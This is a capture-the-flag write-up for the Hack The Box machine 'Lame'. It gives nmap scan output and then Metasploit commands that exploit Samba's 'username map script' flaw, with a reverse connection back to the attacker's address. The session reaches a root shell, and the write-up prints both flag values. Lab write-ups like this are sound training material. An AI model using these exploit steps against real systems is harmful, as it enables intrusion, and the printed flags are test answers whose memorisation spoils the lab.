# lame - HTB

## Recon

### Nmap

```shell
└─$ nmap -sC -sV -Pn -oA nmap/lame 10.10.10.3
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-20 12:32 EDT
Nmap scan report for 10.10.10.3
Host is up (0.011s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m01s, deviation: 2h49m45s, median: 0s
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-09-20T12:32:32-04:00
```

We can see that it is using `Samba smbd 3.X - 4.X ` and on googling that version, I can able to find metasploit exploit.

https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/

So let's get the root from this exploit.

## Shell

Start `msfconsole`.

```
msf6> search samba username
0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution

msf6> use 0

msf6 exploit(multi/samba/usermap_script) > set lhost 10.10.14.6
msf6 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > exploit
whoami
root
cat /root/root.txt
db889423e8fe258e6a7b8ed32898b9ca
cat /home/makis/user.txt
b97ed5745026a71e6493513777849c26
```

Comment - Fairly simple box, teaches about metasploit and CVEs.
